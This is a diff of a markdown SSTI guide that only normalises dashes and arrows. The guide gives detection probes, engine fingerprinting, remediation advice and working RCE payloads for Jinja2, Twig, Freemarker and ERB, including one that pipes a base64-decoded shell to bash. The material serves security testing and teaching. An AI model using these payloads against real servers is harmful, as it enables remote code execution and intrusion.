@@ -1,30 +1,30 @@
-# SSTI — Server-Side Template Injection
+# SSTI - Server-Side Template Injection
 
 ---
 
 ## What It Is
 
-Template engines (Jinja2, Twig, Freemarker, Velocity, etc.) let developers embed expressions like `{{ user.name }}` in HTML. If user input is passed directly into a template **without sanitization**, you can inject template expressions that the server evaluates — leading to code execution.
+Template engines (Jinja2, Twig, Freemarker, Velocity, etc.) let developers embed expressions like `{{ user.name }}` in HTML. If user input is passed directly into a template **without sanitization**, you can inject template expressions that the server evaluates - leading to code execution.
 
 **Key distinction from XSS:** The expression is evaluated **server-side**, not in the browser. You get RCE, not just script injection.
 
 ---
 
-## Detection — The Math Test
+## Detection - The Math Test
 
 Inject a math expression. Different engines use different syntax:
 
 ```
-{{7*7}}         → Jinja2 / Twig → returns 49
-${7*7}          → Freemarker / EL → returns 49
-<%= 7*7 %>      → ERB (Ruby) → returns 49
-#{7*7}          → Ruby (Slim)
-*{7*7}          → Spring EL
-${7*'7'}        → Twig → returns 7777777 (string * int = repeated string)
-{{7*'7'}}       → Jinja2 → returns 7777777
+{{7*7}}         -> Jinja2 / Twig -> returns 49
+${7*7}          -> Freemarker / EL -> returns 49
+<%= 7*7 %>      -> ERB (Ruby) -> returns 49
+#{7*7}          -> Ruby (Slim)
+*{7*7}          -> Spring EL
+${7*'7'}        -> Twig -> returns 7777777 (string * int = repeated string)
+{{7*'7'}}       -> Jinja2 -> returns 7777777
 ```
 
-If the response contains `49` (or `7777777`) where you put the expression → SSTI confirmed.
+If the response contains `49` (or `7777777`) where you put the expression -> SSTI confirmed.
 
 ---
 
@@ -33,26 +33,26 @@ If the response contains `49` (or `7777777`) where you put the expression → SS
 ```
 {{7*'7'}}
 ```
-- Returns `7777777` → **Jinja2** (Python) or **Twig** (PHP)
-- Returns `49` → **Smarty** or **Mako**
-- Errors out → check error message for engine name
+- Returns `7777777` -> **Jinja2** (Python) or **Twig** (PHP)
+- Returns `49` -> **Smarty** or **Mako**
+- Errors out -> check error message for engine name
 
 Also check the tech stack:
-- Python app → likely Jinja2
-- PHP app → likely Twig or Smarty
-- Java app → Freemarker or Velocity
-- Ruby app → ERB
+- Python app -> likely Jinja2
+- PHP app -> likely Twig or Smarty
+- Java app -> Freemarker or Velocity
+- Ruby app -> ERB
 
 ---
 
-## Jinja2 (Python) — RCE
+## Jinja2 (Python) - RCE
 
 ```python
 # Read a file
 {{ ''.__class__.__mro__[1].__subclasses__() }}
-# (this lists all Python subclasses — look for Popen)
+# (this lists all Python subclasses - look for Popen)
 
-# Simpler RCE — execute system commands
+# Simpler RCE - execute system commands
 {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
 
 # If the above is filtered, try through config:
@@ -64,7 +64,7 @@ Also check the tech stack:
 
 ---
 
-## Twig (PHP) — RCE
+## Twig (PHP) - RCE
 
 ```php
 # Execute commands
@@ -80,7 +80,7 @@ Also check the tech stack:
 
 ---
 
-## Freemarker (Java) — RCE
+## Freemarker (Java) - RCE
 
 ```java
 <#assign ex="freemarker.template.utility.Execute"?new()>
@@ -91,7 +91,7 @@ ${ex("bash -c {echo,<base64-shell>}|{base64,-d}|bash")}
 
 ---
 
-## ERB (Ruby) — RCE
+## ERB (Ruby) - RCE
 
 ```ruby
 <%= `id` %>
@@ -102,7 +102,7 @@ ${ex("bash -c {echo,<base64-shell>}|{base64,-d}|bash")}
 
 ## Where to Find It
 
-- URL parameters that appear in page content: `?name=John` → "Hello John"
+- URL parameters that appear in page content: `?name=John` -> "Hello John"
 - Search boxes where the term is reflected back
 - Error messages that include your input
 - Profile fields, subject lines, any user-controlled text that renders
@@ -147,7 +147,7 @@ ${ex("bash -c {echo,<base64-shell>}|{base64,-d}|bash")}
 | Freemarker (Java) | Disable access to `freemarker.template.utility.Execute` class. Use `TemplateClassResolver.SAFER_RESOLVER` in configuration. |
 | ERB (Ruby) | Never call `ERB.new(user_input).result`. Use `ERB.new("Hello <%= name %>").result(binding)` where `name` is set from user input as a variable. |
 
-**Key point for reports:** SSTI gives RCE in almost every case — it's one of the highest severity web vulnerabilities. The fix is architecturally simple (separate template from data) but requires code review to find all instances where user input touches the template engine's render function.
+**Key point for reports:** SSTI gives RCE in almost every case - it's one of the highest severity web vulnerabilities. The fix is architecturally simple (separate template from data) but requires code review to find all instances where user input touches the template engine's render function.
 
 ---
 
